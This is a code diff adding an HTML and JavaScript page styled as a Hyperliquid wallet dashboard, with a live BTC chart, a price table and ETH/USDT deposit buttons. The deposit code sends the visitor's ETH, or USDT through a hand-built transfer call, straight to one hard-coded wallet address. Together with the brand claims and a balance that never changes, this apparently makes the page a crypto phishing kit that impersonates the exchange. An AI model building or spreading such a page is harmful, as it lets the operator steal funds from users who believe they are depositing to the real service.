@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Hyperliquid</title>
+    <link rel="icon" type="image/x-icon" href="favicon/favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="favicon/android-chrome-192x192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="favicon/android-chrome-512x512.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dark: '#0f172a',
+                        primary: '#1e293b',
+                        accent: '#10b981',
+                        'accent-dark': '#059669'
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f1f5f9;
+            font-family: 'Inter', sans-serif;
+        }
+        .crypto-table {
+            border-collapse: separate;
+            border-spacing: 0;
+        }
+        .crypto-table th, .crypto-table td {
+            border-bottom: 1px solid #1e293b;
+            padding: 12px 16px;
+        }
+        .crypto-table th {
+            background-color: #1e293b;
+            font-weight: 600;
+        }
+        .crypto-table tr:last-child td {
+            border-bottom: none;
+        }
+        .crypto-table tr:hover td {
+            background-color: rgba(30, 41, 59, 0.5);
+        }
+        .change-positive {
+            color: #10b981;
+        }
+        .change-negative {
+            color: #ef4444;
+        }
+        .glow-green {
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+        }
+        .pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: .5;
+            }
+        }
+        .crypto-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+            color: white;
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="fixed inset-0 bg-dark flex items-center justify-center z-50">
+        <img src="blob_green.gif" alt="Loading..." class="w-32 h-32">
+    </div>
+
+    <div id="mainContent" class="container mx-auto px-4 py-8 opacity-0 transition-opacity duration-500">
+        <!-- Header -->
+        <header class="flex justify-between items-center mb-8">
+            <div class="flex items-center">
+                <div class="w-10 h-10 rounded-lg bg-accent flex items-center justify-center mr-3">
+                    <img src="blob_green.gif" alt="Hyperliquid Logo" class="w-8 h-8">
+                </div>
+                <h1 class="text-2xl font-bold">Hyperliquid</h1>
+            </div>
+            <div class="flex items-center space-x-4">
+                <div class="text-right">
+                    <div class="text-sm text-gray-400">Wallet</div>
+                    <div id="walletAddress" class="font-medium"></div>
+                </div>
+                <button id="disconnectWallet" class="px-4 py-2 bg-red-500 hover:bg-red-600 rounded-lg font-medium transition duration-300">
+                    Disconnect
+                </button>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main>
+            <!-- Dashboard Overview -->
+            <section class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                <div class="bg-primary p-6 rounded-xl">
+                    <div class="text-gray-400 mb-2">Total Balance</div>
+                    <div class="text-3xl font-bold">$0.00</div>
+                    <div class="text-sm text-gray-400 mt-2">ETH: 0.0000 | USDT: 0.00</div>
+                </div>
+                <div class="bg-primary p-6 rounded-xl">
+                    <div class="text-gray-400 mb-2">Market Status</div>
+                    <div class="flex items-center">
+                        <div class="w-3 h-3 rounded-full bg-green-500 mr-2 pulse"></div>
+                        <div class="text-xl font-bold">Live</div>
+                    </div>
+                    <div class="text-sm text-gray-400 mt-2">Real-time prices</div>
+                </div>
+                <div class="bg-primary p-6 rounded-xl">
+                    <div class="text-gray-400 mb-2">Last Updated</div>
+                    <div id="lastUpdated" class="text-xl font-bold">--:--:--</div>
+                    <div class="text-sm text-gray-400 mt-2">Auto-refresh every 30s</div>
+                </div>
+            </section>
+
+            <!-- Deposit Section -->
+            <section class="mb-12">
+                <div class="bg-primary p-6 rounded-xl">
+                    <h2 class="text-2xl font-bold mb-4">Deposit Funds</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div>
+                            <div class="mb-4">
+                                <label class="block text-gray-400 mb-2">Amount (ETH)</label>
+                                <input 
+                                    type="number" 
+                                    id="ethAmount" 
+                                    placeholder="0.0" 
+                                    step="0.000000000000000001"
+                                    class="w-full bg-dark border border-gray-700 rounded-lg px-4 py-2"
+                                >
+                            </div>
+                            <button 
+                                id="depositETH" 
+                                class="w-full px-4 py-2 bg-accent hover:bg-accent-dark rounded-lg font-medium transition duration-300"
+                            >
+                                Deposit ETH
+                            </button>
+                        </div>
+                        <div>
+                            <div class="mb-4">
+                                <label class="block text-gray-400 mb-2">Amount (USDT)</label>
+                                <input 
+                                    type="number" 
+                                    id="usdtAmount" 
+                                    placeholder="0.0" 
+                                    step="0.000001"
+                                    class="w-full bg-dark border border-gray-700 rounded-lg px-4 py-2"
+                                >
+                            </div>
+                            <button 
+                                id="depositUSDT" 
+                                class="w-full px-4 py-2 bg-accent hover:bg-accent-dark rounded-lg font-medium transition duration-300"
+                            >
+                                Deposit USDT
+                            </button>
+                        </div>
+                    </div>
+                    <div class="mt-6">
+                        <h3 class="text-lg font-bold mb-2">Deposit Instructions</h3>
+                        <ol class="list-decimal list-inside text-gray-400 space-y-2">
+                            <li>Enter the amount of ETH or USDT you want to deposit</li>
+                            <li>Click the "Deposit ETH" or "Deposit USDT" button</li>
+                            <li>Confirm the transaction in your MetaMask wallet</li>
+                            <li>Wait for network confirmation</li>
+                            <li>Your balance will update automatically</li>
+                        </ol>
+                    </div>
+                </div>
+            </section>
+
+            <!-- BTC Price Chart -->
+            <section class="mb-12">
+                <div class="bg-primary p-6 rounded-xl">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-2xl font-bold">BTC Price Chart</h2>
+                        <div class="flex space-x-2">
+                            <select id="timeframeSelector" class="px-3 py-1 bg-dark hover:bg-gray-700 rounded-lg text-sm transition duration-300">
+                                <option value="15">15m</option>
+                                <option value="60">1H</option>
+                                <option value="240">4H</option>
+                                <option value="1D">1D</option>
+                                <option value="1W">1W</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="h-96" id="tv_chart_container"></div>
+                </div>
+            </section>
+
+            <!-- Crypto Prices Table -->
+            <section>
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-2xl font-bold">Market Prices</h2>
+                    <div class="flex space-x-2">
+                        <button id="refreshData" class="px-4 py-2 bg-accent hover:bg-accent-dark rounded-lg font-medium transition duration-300">
+                            Refresh
+                        </button>
+                    </div>
+                </div>
+                <div class="bg-primary rounded-xl overflow-hidden">
+                    <div class="overflow-x-auto">
+                        <table class="crypto-table w-full">
+                            <thead>
+                                <tr>
+                                    <th class="text-left">Asset</th>
+                                    <th class="text-right">Price</th>
+                                    <th class="text-right">24h Change</th>
+                                    <th class="text-right">Market Cap</th>
+                                    <th class="text-right">Trade</th>
+                                </tr>
+                            </thead>
+                            <tbody id="cryptoTableBody">
+                                <!-- Data will be populated by JavaScript -->
+                                <tr>
+                                    <td colspan="5" class="text-center py-8 text-gray-500">
+                                        <div class="flex justify-center">
+                                            <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-accent"></div>
+                                        </div>
+                                        <p class="mt-2">Loading market data...</p>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- Footer -->
+        <footer class="mt-16 pt-8 border-t border-primary text-gray-500">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col md:flex-row justify-between items-center">
+                    <div class="mb-4 md:mb-0">
+                        <p>© 2025 Hyperliquid. All rights reserved.</p>
+                    </div>
+                    <div class="mb-4 md:mb-0">
+                        <img src="blob_green.gif" alt="Hyperliquid Logo" class="h-8">
+                    </div>
+                    <div class="flex space-x-6">
+                        <a href="terms.html" class="text-accent hover:text-accent-dark transition duration-300">Terms</a>
+                        <a href="privacy-policy.html" class="text-accent hover:text-accent-dark transition duration-300">Privacy Policy</a>
+                        <a href="https://hyperliquid.gitbook.io/hyperliquid-docs" target="_blank" class="text-accent hover:text-accent-dark transition duration-300">Documentation</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    <script>
+        // Loading screen functionality
+        window.addEventListener('load', function() {
+            // Set a timeout to hide the loading screen after 4 seconds
+            setTimeout(function() {
+                const loadingScreen = document.getElementById('loadingScreen');
+                const mainContent = document.getElementById('mainContent');
+                
+                if (loadingScreen && mainContent) {
+                    // Fade out the loading screen
+                    loadingScreen.style.opacity = '0';
+                    loadingScreen.style.transition = 'opacity 0.5s ease-out';
+                    
+                    // After fade out, hide the loading screen and show content
+                    setTimeout(function() {
+                        loadingScreen.style.display = 'none';
+                        mainContent.classList.remove('opacity-0');
+                    }, 500);
+                }
+            }, 4000);
+        });
+
+        // Check if wallet is connected
+        window.addEventListener('load', async function() {
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await ethereum.request({ method: 'eth_accounts' });
+                if (accounts.length > 0) {
+                    document.getElementById('walletAddress').textContent = `${accounts[0].substring(0, 6)}...${accounts[0].substring(accounts[0].length - 4)}`;
+                } else {
+                    window.location.href = 'index.html';
+                }
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        // Disconnect wallet function
+        document.getElementById('disconnectWallet').addEventListener('click', async function() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    await ethereum.request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] });
+                    window.location.href = 'index.html';
+                } catch (error) {
+                    console.error("Error disconnecting wallet:", error);
+                    window.location.href = 'index.html';
+                }
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        // Convert ETH to wei
+        function ethToWei(eth) {
+            // Convert ETH to wei without using ethers.js
+            const weiPerEth = '1000000000000000000'; // 1 ETH = 10^18 wei
+            // Convert to BigInt for precision
+            const ethBigInt = BigInt(Math.floor(eth * 1000000000000000000));
+            return '0x' + ethBigInt.toString(16);
+        }
+
+        // Deposit ETH function
+        document.getElementById('depositETH').addEventListener('click', async function() {
+            if (typeof window.ethereum === 'undefined') {
+                alert('MetaMask is not installed!');
+                return;
+            }
+
+            try {
+                // Get the amount from input
+                const ethAmount = parseFloat(document.getElementById('ethAmount').value);
+                if (!ethAmount || ethAmount <= 0) {
+                    alert('Please enter a valid ETH amount');
+                    return;
+                }
+
+                // Convert ETH to wei
+                const weiAmount = ethToWei(ethAmount);
+
+                // Request account access if needed
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const account = accounts[0];
+
+                // Send ETH transaction
+                const transactionParameters = {
+                    to: '0x77a0A2b2Dae50cf528DFf84043db32BF33Fb15Cb', // Deposit address
+                    from: account,
+                    value: weiAmount, // Amount in wei
+                };
+
+                // Send the transaction
+                const txHash = await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                alert(`ETH deposit sent successfully! Hash: ${txHash}`);
+            } catch (error) {
+                console.error('Error sending ETH:', error);
+                alert(`Error sending ETH: ${error.message}`);
+            }
+        });
+
+        // Deposit USDT function
+        document.getElementById('depositUSDT').addEventListener('click', async function() {
+            if (typeof window.ethereum === 'undefined') {
+                alert('MetaMask is not installed!');
+                return;
+            }
+
+            try {
+                // Get the amount from input
+                const usdtAmount = parseFloat(document.getElementById('usdtAmount').value);
+                if (!usdtAmount || usdtAmount <= 0) {
+                    alert('Please enter a valid USDT amount');
+                    return;
+                }
+
+                // Convert USDT to smallest unit (6 decimals)
+                const usdtAmountInSmallestUnit = Math.floor(usdtAmount * 1000000).toString();
+
+                // Request account access if needed
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const account = accounts[0];
+
+                // USDT contract address on Ethereum mainnet
+                const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+
+                // USDT transfer function signature
+                const functionSignature = '0xa9059cbb'; // transfer(address,uint256)
+
+                // Recipient address (deposit address)
+                const toAddress = '0x77a0A2b2Dae50cf528DFf84043db32BF33Fb15Cb';
+
+                // Construct transaction data
+                const data = functionSignature + 
+                    '000000000000000000000000' + toAddress.substring(2) + 
+                    '0000000000000000000000000000000000000000000000000000000000000000'.substring(0, 64 - usdtAmountInSmallestUnit.length) + usdtAmountInSmallestUnit;
+
+                // Send USDT transaction
+                const transactionParameters = {
+                    to: usdtContractAddress, // USDT contract address
+                    from: account,
+                    data: data, // Transaction data
+                };
+
+                // Send the transaction
+                const txHash = await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                alert(`USDT deposit sent successfully! Hash: ${txHash}`);
+            } catch (error) {
+                console.error('Error sending USDT:', error);
+                alert(`Error sending USDT: ${error.message}`);
+            }
+        });
+
+        // Format price function
+        function formatPrice(price) {
+            if (price < 1) {
+                return `$${parseFloat(price).toFixed(6)}`;
+            } else {
+                return `$${parseFloat(price).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+            }
+        }
+
+        // Format market cap function
+        function formatMarketCap(marketCap) {
+            if (marketCap >= 1e12) {
+                return `$${(marketCap / 1e12).toFixed(2)}T`;
+            } else if (marketCap >= 1e9) {
+                return `$${(marketCap / 1e9).toFixed(2)}B`;
+            } else if (marketCap >= 1e6) {
+                return `$${(marketCap / 1e6).toFixed(2)}M`;
+            } else {
+                return `$${marketCap.toFixed(2)}`;
+            }
+        }
+
+        // Get crypto icon with actual logos
+        function getCryptoIcon(symbol, imageUrl) {
+            // Use the CoinGecko API image URL if available, otherwise use a placeholder
+            const logoUrl = imageUrl || `https://placehold.co/32x32/334155/white?text=${symbol.charAt(0)}`;
+            
+            // Return the icon HTML
+            return `
+                <img src="${logoUrl}" alt="${symbol} logo" class="w-8 h-8 rounded-full" onerror="this.src='https://placehold.co/32x32/334155/white?text=${symbol.charAt(0)}'">
+            `;
+        }
+
+        // Fetch crypto data function
+        async function fetchCryptoData() {
+            try {
+                // Show loading state
+                document.getElementById('cryptoTableBody').innerHTML = `
+                    <tr>
+                        <td colspan="5" class="text-center py-8 text-gray-500">
+                            <div class="flex justify-center">
+                                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-accent"></div>
+                            </div>
+                            <p class="mt-2">Loading market data...</p>
+                        </td>
+                    </tr>
+                `;
+
+                // Fetch data from our API (Netlify serverless function)
+                const response = await fetch('/.netlify/functions/crypto-prices');
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    const cryptoData = result.data;
+
+                    // Update last updated time
+                    const now = new Date();
+                    document.getElementById('lastUpdated').textContent = now.toLocaleTimeString();
+
+                    // Populate table
+                    const tableBody = document.getElementById('cryptoTableBody');
+                    tableBody.innerHTML = '';
+
+                    // Display only top 20 cryptocurrencies
+                    const displayData = cryptoData.slice(0, 20);
+
+                    displayData.forEach(crypto => {
+                        const row = document.createElement('tr');
+                        
+                        row.innerHTML = `
+                            <td class="font-medium">
+                                <div class="flex items-center">
+                                    ${getCryptoIcon(crypto.symbol, crypto.image)}
+                                    <div class="ml-3">
+                                        <div>${crypto.name}</div>
+                                        <div class="text-sm text-gray-400">${crypto.symbol}</div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td class="text-right font-medium">${formatPrice(crypto.price)}</td>
+                            <td class="text-right ${crypto.change24h >= 0 ? 'change-positive' : 'change-negative'}">
+                                ${crypto.change24h >= 0 ? '+' : ''}${crypto.change24h.toFixed(2)}%
+                            </td>
+                            <td class="text-right text-gray-400">${formatMarketCap(crypto.marketCap)}</td>
+                            <td class="text-right">
+                                <button class="px-3 py-1 bg-accent hover:bg-accent-dark rounded text-sm font-medium transition duration-300">
+                                    Trade
+                                </button>
+                            </td>
+                        `;
+                        
+                        tableBody.appendChild(row);
+                    });
+                } else {
+                    throw new Error(result.message || 'Failed to fetch data');
+                }
+            } catch (error) {
+                console.error("Error fetching crypto data:", error);
+                document.getElementById('cryptoTableBody').innerHTML = `
+                    <tr>
+                        <td colspan="5" class="text-center py-8 text-red-500">
+                            Error loading market data. Please try again later.
+                        </td>
+                    </tr>
+                `;
+            }
+        }
+
+        // Initial data load
+        fetchCryptoData();
+
+        // Refresh data button
+        document.getElementById('refreshData').addEventListener('click', fetchCryptoData);
+
+        // Auto-refresh every 30 seconds
+        setInterval(fetchCryptoData, 30000);
+
+        // Initialize TradingView chart
+        function initTradingViewChart() {
+            new TradingView.widget({
+                "autosize": true,
+                "symbol": "BITSTAMP:BTCUSD",
+                "interval": "15",
+                "timezone": "Etc/UTC",
+                "theme": "dark",
+                "style": "1",
+                "locale": "en",
+                "toolbar_bg": "#1e293b",
+                "enable_publishing": false,
+                "hide_top_toolbar": false,
+                "hide_legend": false,
+                "save_image": false,
+                "container_id": "tv_chart_container"
+            });
+        }
+
+        // Update TradingView chart interval
+        function updateTradingViewInterval(interval) {
+            // Reload the chart with new interval
+            document.getElementById('tv_chart_container').innerHTML = '';
+            new TradingView.widget({
+                "autosize": true,
+                "symbol": "BITSTAMP:BTCUSD",
+                "interval": interval,
+                "timezone": "Etc/UTC",
+                "theme": "dark",
+                "style": "1",
+                "locale": "en",
+                "toolbar_bg": "#1e293b",
+                "enable_publishing": false,
+                "hide_top_toolbar": false,
+                "hide_legend": false,
+                "save_image": false,
+                "container_id": "tv_chart_container"
+            });
+        }
+
+        // Initialize chart when page loads and DOM is ready
+        document.addEventListener('DOMContentLoaded', function() {
+            initTradingViewChart();
+            
+            // Add event listener for timeframe selector
+            document.getElementById('timeframeSelector').addEventListener('change', function() {
+                updateTradingViewInterval(this.value);
+            });
+        });
+    </script>
+</body>
+</html>
